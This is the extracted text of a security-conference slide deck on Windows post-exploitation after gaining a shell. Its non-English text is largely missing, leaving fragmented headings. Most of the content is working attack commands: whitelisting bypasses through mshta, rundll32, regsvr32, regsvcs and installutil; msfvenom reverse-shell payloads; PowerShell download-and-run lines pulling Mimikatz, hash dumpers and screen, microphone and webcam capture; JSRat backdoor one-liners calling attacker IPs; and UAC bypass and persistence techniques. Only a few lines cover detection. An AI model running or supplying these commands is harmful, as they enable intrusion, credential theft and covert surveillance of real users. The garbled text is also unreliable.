Shell is Only the Beginning----
3gstudent & Evi1cg

As a offensive researcher, if you can dream it,someone has likely already done it and that someone isn't the kind of person who speaks at security cons...
----Matt Graeber

3gstudent

Good Study

Good Health

Good Attitude

Evi1cg

Thin

WhiteHat

Security Researcher



  



 



·  · Open Proxy

· 

· 

· Bypass Application Whitelisting · Escalate Privileges

·  · Gather Information

·  · Persistence

·  · Detection and Mitigations

 Open Proxy

?
·  · shell · It's the beginning


Client-> Lcx, Netsh; HTTP-> Tunnel; Metasploit-> Portpwd SocksClient-> Ew,Xsocks; HTTP-> ReGeorg; Metasploit-> Socks4a SSH, ICMP  Vpn


 · ,"" · ,
egWindows Applocker

Windows AppLocker

"" 

 Bypass Application Whitelisting


ü Hta ü Office Macro ü Cpl ü Chm ü Powershell ü Rundll32 ü Regsvr32 ü Regsvcs ü Installutil
...

1Hta
More
· Mshta.exe vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.cl ose)
· Mshta.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe ",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveX Object("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}

2Office Macro
MacroRaptor · Detect malicious VBA Macros · Python · https://bitbucket.org/decalage/oletools/wiki/mraptor

3Cpl

DLL/CPL:

Payload.dll: msfvenom -p windows/meterpreter/reverse_tcp -b `\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o payload.dll

(1) dll rundll32 shell32.dll,Control_RunDLL payload.dll (2) dllcpl (3) dll

From: http://drops.wooyun.org/tips/16042

4Chm
""  http://drops.wooyun.org/tips/14254
CHM 

5Powershell

Command:
· powershell -nop -exec bypass -c IEX (New-Objectet.WebClient).DownloadString('http://ip:port/') · Get-Content payload.ps1 | iex · cmd.exe /K < payload.bat
Lnk
· powershell -nop -windows hidden -E YwBhAGwAYwAuAGUAeABlAA==

powershell:
· .Netpowershell https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/
· p0wnedShell https://github.com/Cn33liz/p0wnedShell
· PowerOPS https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/

6Rundll32
javascript :
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop exec bypass -c IEX (New-Object Net.WebClient).DownloadString(`http://ip:port/');")
Dll
rundll32 shell32.dll,Control_RunDLL payload.dll
From: http://drops.wooyun.org/tips/11764

7Regsvr32

Regsvr32.exe.sct



regsvr32 /u /n /s /i:payload.sct scrobj.dll

regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll



From:

http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html http://drops.wooyun.org/tips/15124

8Regsvcs

Regasm & Regsvcs
key -> key.snk
$key = `BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVA gSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC5 31ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3 pX0BDXq wEfoZZ+hiIk1YUD SNOE79z wnp VP1+BN0P K5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXG N0/+Hitoluf o7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU 0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHc gJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6 nWHMoMYV5VMTZ0jLM5aZQ6ypwm FZaNmtL6KD zKv8L1YN 2TkKjXEoWulXNliBpelsSJy uICplrCTPGGSxPGihT3r pZ9tbLZUefrFnLNiHfVjNi53Yg4=' $Content = [System.Convert]::FromBase64String($key) Set-Content key.snk -Value $Content -Encoding Byte  C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:Regasm.dll /keyfile:key.snk Regasm.cs  C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Regasm.dll [OR] C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe Regasm.dll ///U
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U Regasm.dll C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U Regasm.dll

From: https://gist.github.com/subTee/e1c54e1fdafc15674c9a

InstallUtil

9Installutil



C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:InstallUtil.exe InstallUtil.cs

/U

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U InstallUtil.exe

From:

http://subt0x10.blogspot.jp/2015/08/application-whitelisting-bypasses-101.html http://drops.wooyun.org/tips/8862

10
ps,http://go.mssec.se/AppLockerBC
From: http://drops.wooyun.org/tips/11804

11 

 Escalate Privileges


·  ·  ·  · Phishing


 https://github.com/GDSSecurity/Windows-Exploit-Suggester systeminfo: Systeminfo > 1.txt  python windows-exploit-suggester.py --database 2016-05-31-mssb.xls -systeminfo ~/Desktop/1.txt


Exp ExpPowershell http://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html

Demo Time



MssqlMysqlOracleFtp

Dll
Powerup
http://drops.wooyun.org/tips/11989


Windows -> Potato NTLMHTTP > SMBNBNS  http://tools.pwn.ren/2016/01/17/potato-windows.html

Phishing
MSF Ask
exploit/windows/local/ask runasuac msf metasploit/lib/msf/core/post/windows/runas.rb

Phishing Demo

 Gather Information

Gather Information
  1 2UAC

Bypass UAC

ü IFileOperation COM ü Wusa.exeextract ü SHELLCODE  ü DLLDLL ü UAC ü Phishing
http://evi1cg.me/archives/Powershell_Bypass_UAC.html ü http://www.powershellempire.com/?page_id=380


mstsc   Netripper

GetPass Tips
  powershell
From:https://github.com/Ridter/Pentest/blob/master/note/Powershell_MSFCapture.md

GetPass Tips
MSF post/windows/gather/phish_windows_credentials



Installed Programs

Startup Items

Installed Services

Security Services File/Printer Shares DatabaseServers

Certificate Authority

Sensitive Data

Key-logging

Screen capture

Network traffic capture

User Information

System Configuration

Password Policy

Security Policies Configured Wireless Networks and Keys

 

()-Powershell

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(`http://evi1cg.me/powershell/Show-TargetScreen.ps1'); Show-TargetScreen"

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(`https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1');GetMicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias `SECRET'"

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(`https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1'); Capture-MiniEye -RecordTime 2 Path $env:temp\hack.avi"-Path $env:temp\hack.avi"
Hash:
powershell IEX (New-Object Net.WebClient).DownloadString(`https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz

Empire:

()-Powershell
Metasploit:

()- js
JsRat
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest. 5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.S end();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WSc ript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
From: JavaScript Backdoor  http://drops.wooyun.org/tips/11764 JavaScript Phishing http://drops.wooyun.org/tips/12386

()- mshta
JsRat
Mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp .WinHttpRequest.5.1");h.Open("GET","http://192.16 8.2.101:9998/connect",false);try{h.Send();b=h.Res ponseText;eval(b);}catch(e){new%20ActiveXObject(" WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}

SCT

()- sct

regsvr32 /u /s /i:http://urlto/calc.sct scrobj.dll

Calc.sct

From:  Use SCT to Bypass Application Whitelisting Protection http://drops.wooyun.org/tips/15124

() - wsc

Wsc

rundll32.exe javascript:"\..\mshtml,RunHTMLApplic ation ";document.write();GetObject("script :http://urlto/calc.wsc")

Calc.wsc

From:  WSCJSRAT and WMI Backdoor http://drops.wooyun.org/tips/15575

Demo Time

 Persistence


ü  ü  ü wmi ü at ü schtasks ü 


Bitsadmin
·  ·  · Win7 Win8Server 2008 · Autoruns · MSRC(Microsoft Security Response Center)

Demo Time

 Detection and Mitigations

Detection and Mitigations
· bitsadmin /list /allusers /verbose · Stop Background Intelligent Transfer Service

Detection and Mitigations

drops

Special thanks to
Casey Smith @subTee

Reference
1Shell is Only the Beginning quote from Carlos Perez's Blog http://www.darkoperator.com/ 2 Matt Graeber's idea quote from https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-APersistent%20Asynchronous-And-Fileless-Backdoor.pdf

Q & A
3

